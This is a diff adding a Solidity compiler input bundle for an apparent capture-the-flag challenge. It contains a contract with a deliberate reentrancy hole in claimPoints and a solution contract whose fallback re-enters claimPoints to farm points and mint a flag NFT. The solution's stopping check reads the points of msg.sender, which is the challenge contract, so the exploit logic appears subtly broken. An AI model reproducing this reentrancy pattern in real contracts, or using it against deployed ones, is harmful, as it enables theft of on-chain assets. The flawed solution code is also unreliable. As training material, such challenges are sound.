@@ -1,0 +1,42 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/INFTFlags.sol": {
+      "content": "//SPDX-License-Identifier: MIT\r\npragma solidity >=0.8.0 <0.9.0;\r\n\r\ninterface INFTFlags {\r\n    function mint(address _recipient, uint256 _challengeId) external;\r\n\r\n    function hasMinted(address _recipient, uint256 _challengeId) external view returns (bool);\r\n\r\n    function tokenIdCounter() external view returns (uint256);\r\n}\r\n"
+    },
+    "contracts/S1/Season1Challenge5.sol": {
+      "content": "//SPDX-License-Identifier: MIT\r\npragma solidity >=0.8.0 <0.9.0;\r\n\r\nimport \"../INFTFlags.sol\";\r\n\r\ncontract Season1Challenge5 {\r\n    address public nftContract;\r\n    mapping(address => uint256) public points;\r\n    uint256 public constant POINTS_TO_MINT = 10;\r\n\r\n    constructor(address _nftContract) {\r\n        nftContract = _nftContract;\r\n    }\r\n\r\n    function resetPoints() public {\r\n        points[tx.origin] = 0;\r\n    }\r\n\r\n    function claimPoints() public {\r\n        require(points[tx.origin] == 0, \"Already claimed points\");\r\n        (bool success, ) = msg.sender.call(\"\");\r\n        require(success, \"External call failed\");\r\n\r\n        points[tx.origin] += 1;\r\n    }\r\n\r\n    function mintFlag() public {\r\n        require(points[tx.origin] >= POINTS_TO_MINT, \"Not enough points\");\r\n        points[tx.origin] -= POINTS_TO_MINT;\r\n        INFTFlags(nftContract).mint(tx.origin, 5);\r\n    }\r\n}\r\n"
+    },
+    "contracts/S1/Season1Challenge5Solution.sol": {
+      "content": "//SPDX-License-Identifier: MIT\r\npragma solidity >=0.8.0 <0.9.0;\r\n\r\nimport \"./Season1Challenge5.sol\";\r\n\r\ncontract Season1Challenge5Solution {\r\n\r\n    Season1Challenge5 private challenge5;\r\n\r\n    constructor(address _season1Challenge5) {\r\n        challenge5 = Season1Challenge5(_season1Challenge5);\r\n    }\r\n\r\n    function solve() public {\r\n        challenge5.claimPoints();\r\n    }\r\n\r\n    fallback() external payable {\r\n        // 1.通过fallback函数，递归调用claimPoints，直到达到points要求\r\n        uint256 points = challenge5.points(msg.sender);\r\n        // 1. 如果没达到points要求，递归调用\r\n        if (points < 10) {\r\n            challenge5.claimPoints();\r\n        }\r\n    }\r\n\r\n    receive() external payable {\r\n        \r\n    }\r\n\r\n\r\n}\r\n"
+    }
+  },
+  "settings": {
+    "optimizer": {
+      "enabled": true,
+      "runs": 200
+    },
+    "evmVersion": "paris",
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata",
+          "devdoc",
+          "userdoc",
+          "storageLayout",
+          "evm.gasEstimates"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    },
+    "metadata": {
+      "useLiteralContent": true
+    }
+  }
+}
